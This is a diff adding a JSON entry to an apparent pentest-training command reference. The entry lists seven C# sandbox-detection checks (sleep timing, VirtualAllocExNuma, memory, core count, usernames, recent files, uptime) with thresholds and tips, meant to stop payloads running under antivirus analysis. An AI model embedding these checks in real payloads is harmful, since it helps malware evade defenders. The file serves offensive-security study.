@@ -1,0 +1,235 @@
+{
+  "category": "Heuristic Evasion",
+  "description": "Behavioral and heuristic antivirus evasion techniques. Detect sandbox environments, emulation, and dynamic analysis to prevent payload execution in AV testing environments.",
+  "commands": [
+    {
+      "id": "sleep-timer-validation",
+      "name": "Sleep Timer with Validation",
+      "description": "Detect sandbox by measuring actual elapsed time vs requested sleep duration. Sandboxes skip Sleep() calls to speed up analysis - detect by checking if sufficient time actually passed.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "sleep",
+        "csharp"
+      ],
+      "command": "using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(<SLEEP_MS>);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < <THRESHOLD_SEC>) {\n    return; // Sandbox detected\n}\n// Continue execution",
+      "variables": [
+        {
+          "name": "<SLEEP_MS>",
+          "description": "Sleep duration in milliseconds (10000 = 10 seconds)",
+          "example": "10000",
+          "required": true
+        },
+        {
+          "name": "<THRESHOLD_SEC>",
+          "description": "Minimum acceptable elapsed time in seconds (slightly less than sleep to allow processing time)",
+          "example": "9.5",
+          "required": true
+        }
+      ],
+      "notes": "Syntax: Add to C# Main() before payload execution Simple but effective against basic sandboxes. 10 seconds standard. Combine with other checks for best results. See also: csharp-sleep-timer in shellcode-runners. Time estimate: 1 minute (integration) References: docs/av-evasion/heuristic-evasion.md#sleep-timer, shellcode-runners.json#csharp-sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative: Use GetTickCount() before/after sleep, or QueryPerformanceCounter for high-resolution timing",
+      "success_indicators": [
+        "In sandbox: Exits immediately. On real system: Waits full duration then continues."
+      ],
+      "failure_indicators": [
+        "Advanced sandboxes honor Sleep() - Use additional checks",
+        "Threshold too strict - System overhead may cause false positives",
+        "Too short sleep - Obvious to user that program is delaying"
+      ]
+    },
+    {
+      "id": "non-emulated-api-numa",
+      "name": "Non-Emulated API (VirtualAllocExNuma)",
+      "description": "Detect sandbox/emulation by calling VirtualAllocExNuma - rarely emulated API. If returns NULL, indicates emulated environment. NUMA APIs require actual hardware support.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "api-check",
+        "csharp"
+      ],
+      "command": "using System;\nusing System.Runtime.InteropServices;\n\n[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr GetCurrentProcess();\n\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\nif(mem == IntPtr.Zero) {\n    return; // Sandbox detected\n}",
+      "variables": [],
+      "notes": "Syntax: Add to C# Main() before payload execution More sophisticated than sleep timer. Bypasses time-aware sandboxes. Quick to implement. See also: csharp-non-emulated-api in shellcode-runners. Time estimate: 2 minutes (integration) References: docs/av-evasion/heuristic-evasion.md#non-emulated-apis, shellcode-runners.json#csharp-non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative: Use FlsAlloc, GetTickCount64, or other non-emulated APIs. Check for debugger with IsDebuggerPresent.",
+      "success_indicators": [
+        "In sandbox: Returns IntPtr.Zero, exits. On real system: Returns valid memory address, continues."
+      ],
+      "failure_indicators": [
+        "Some real systems lack NUMA support - May cause false positives on older hardware",
+        "Advanced sandboxes emulate this API - Combine multiple checks",
+        "Wrong comparison - Use IntPtr.Zero not null"
+      ]
+    },
+    {
+      "id": "large-memory-allocation",
+      "name": "Large Memory Allocation Check",
+      "description": "Detect limited sandbox resources by attempting large memory allocation. Sandboxes often have memory constraints - fail if allocation fails.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "memory",
+        "csharp"
+      ],
+      "command": "using System;\n\nIntPtr mem = IntPtr.Zero;\ntry {\n    mem = Marshal.AllocHGlobal(<LARGE_SIZE>); // e.g., 100MB\n    if(mem == IntPtr.Zero) {\n        return; // Allocation failed - sandbox\n    }\n    Marshal.FreeHGlobal(mem);\n} catch {\n    return; // Exception - sandbox\n}",
+      "variables": [
+        {
+          "name": "<LARGE_SIZE>",
+          "description": "Memory size to allocate in bytes (100000000 = ~100MB)",
+          "example": "100000000",
+          "required": true
+        }
+      ],
+      "notes": "Syntax: Add before payload execution Simple but less reliable than API checks. Best used as additional layer. 100MB is safe middle ground. Don't go too large or real systems fail. Time estimate: 1 minute References: docs/av-evasion/heuristic-evasion.md#memory-checks Manual alternative: Use VirtualAlloc with large size, or allocate multiple large arrays",
+      "success_indicators": [
+        "In sandbox: Allocation fails or throws exception. On real system: Allocates successfully."
+      ],
+      "failure_indicators": [
+        "Real systems with low memory may fail - Use moderate size (100-500MB)",
+        "Modern sandboxes may provide generous memory - Less reliable than API checks"
+      ]
+    },
+    {
+      "id": "check-processor-count",
+      "name": "Processor Count Check",
+      "description": "Detect VM/sandbox by checking CPU core count. Sandboxes typically have 1-2 cores. Real systems usually have 4+. Simple environmental check.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "environment",
+        "csharp"
+      ],
+      "command": "using System;\n\nint cores = Environment.ProcessorCount;\nif(cores < <MIN_CORES>) {\n    return; // Sandbox detected\n}",
+      "variables": [
+        {
+          "name": "<MIN_CORES>",
+          "description": "Minimum required CPU cores (2 or 4 typical)",
+          "example": "2",
+          "required": true
+        }
+      ],
+      "notes": "Syntax: Add at start of Main() Very simple check, takes 1 line. Not foolproof but adds friction. Use 2 cores as threshold for broader compatibility. Combine with API checks. Time estimate: 30 seconds References: docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative: Check RAM size, disk size, screen resolution, or installed programs",
+      "success_indicators": [
+        "In sandbox: Low core count, exits. On real system: Sufficient cores, continues."
+      ],
+      "failure_indicators": [
+        "Old real systems may have 1-2 cores - Use threshold of 2, not 4",
+        "Modern sandboxes may provision more cores - Combine with other checks",
+        "VMs in enterprise may have limited cores - Consider target environment"
+      ]
+    },
+    {
+      "id": "check-username-environment",
+      "name": "Username/Hostname Check",
+      "description": "Detect sandbox by checking for common analysis usernames/hostnames (sandbox, malware, virus, analysis, etc.). Simple string matching.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "environment",
+        "csharp"
+      ],
+      "command": "using System;\n\nstring username = Environment.UserName.ToLower();\nstring hostname = Environment.MachineName.ToLower();\n\nstring[] suspiciousNames = { \"sandbox\", \"malware\", \"virus\", \"analysis\", \"sample\", \"test\" };\n\nforeach(string name in suspiciousNames) {\n    if(username.Contains(name) || hostname.Contains(name)) {\n        return; // Sandbox detected\n    }\n}",
+      "variables": [],
+      "notes": "Syntax: Add at start of Main() Low-hanging fruit. Easy to bypass but catches lazy sandboxes. Add common virtualization terms (vmware, vbox, qemu). Not reliable for exam but quick to add. Time estimate: 2 minutes References: docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative: Check for specific sandbox artifacts (files, registry keys, processes), or known MAC address ranges",
+      "success_indicators": [
+        "In sandbox: Matches suspicious name, exits. On real system: Normal username/hostname, continues."
+      ],
+      "failure_indicators": [
+        "False positives - User named 'Anderson' contains 'sand' - use exact matching or longer strings",
+        "Sophisticated sandboxes use realistic names - Not reliable alone",
+        "Legitimate test environments may trigger - Consider context"
+      ]
+    },
+    {
+      "id": "check-recent-files",
+      "name": "Recent Files Check",
+      "description": "Detect fresh sandbox by checking if user has recent files/documents. Real systems have user activity artifacts. Fresh sandboxes typically have empty recent files.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "artifacts",
+        "csharp"
+      ],
+      "command": "using System;\nusing System.IO;\n\nstring recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);\nint fileCount = Directory.GetFiles(recentPath).Length;\n\nif(fileCount < <MIN_FILES>) {\n    return; // Fresh sandbox detected\n}",
+      "variables": [
+        {
+          "name": "<MIN_FILES>",
+          "description": "Minimum expected recent files (5-10 typical for real system)",
+          "example": "5",
+          "required": true
+        }
+      ],
+      "notes": "Syntax: Add before payload execution Clever check that's hard to fake realistically. Real systems accumulate artifacts over time. 5 files is safe threshold. Good for targeted attacks where you know environment. Time estimate: 2 minutes References: docs/av-evasion/heuristic-evasion.md#artifact-checks Manual alternative: Check browser history, cookie count, installed programs, or Windows event log size",
+      "success_indicators": [
+        "In sandbox: Low/zero file count, exits. On real system: Multiple recent files, continues."
+      ],
+      "failure_indicators": [
+        "Clean real systems may have few files - Use low threshold (3-5)",
+        "Exception if path doesn't exist - Wrap in try/catch",
+        "Sandboxes may pre-populate artifacts - Combine with other checks"
+      ]
+    },
+    {
+      "id": "check-uptime",
+      "name": "System Uptime Check",
+      "description": "Detect fresh sandbox by checking system uptime. Fresh analysis environments typically have very short uptime (<10 minutes). Real systems usually have hours/days uptime.",
+      "category": "heuristic-evasion",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "heuristic",
+        "sandbox-detection",
+        "uptime",
+        "csharp"
+      ],
+      "command": "using System;\n\nint uptimeMS = Environment.TickCount;\nint uptimeMinutes = uptimeMS / 60000;\n\nif(uptimeMinutes < <MIN_UPTIME_MINUTES>) {\n    return; // Fresh sandbox detected\n}",
+      "variables": [
+        {
+          "name": "<MIN_UPTIME_MINUTES>",
+          "description": "Minimum system uptime in minutes (10-30 typical)",
+          "example": "10",
+          "required": true
+        }
+      ],
+      "notes": "Syntax: Add at start of Main() Effective against automated analysis. 10 minutes is safe threshold (most analysis completes in 5 min). Don't use values >30 min to avoid false positives on legitimate reboots. Time estimate: 1 minute References: docs/av-evasion/heuristic-evasion.md#uptime-checks Manual alternative: Check last boot time via WMI, or check process start times for long-running system processes",
+      "success_indicators": [
+        "In sandbox: Low uptime, exits. On real system: Longer uptime, continues."
+      ],
+      "failure_indicators": [
+        "User just rebooted - False positive if threshold too high",
+        "Environment.TickCount rolls over at 49.7 days - Use GetTickCount64 for accuracy",
+        "Persistent sandboxes may have long uptime - Less reliable for cloud sandboxes"
+      ]
+    }
+  ],
+  "oscp_relevance": "Essential for bypassing behavioral analysis and sandboxing. Modern AV relies heavily on heuristics - signature evasion alone is insufficient.",
+  "attack_chain_position": "Payload Delivery, Evasion",
+  "related_categories": [
+    "shellcode-runners",
+    "signature-evasion",
+    "windows"
+  ]
+}
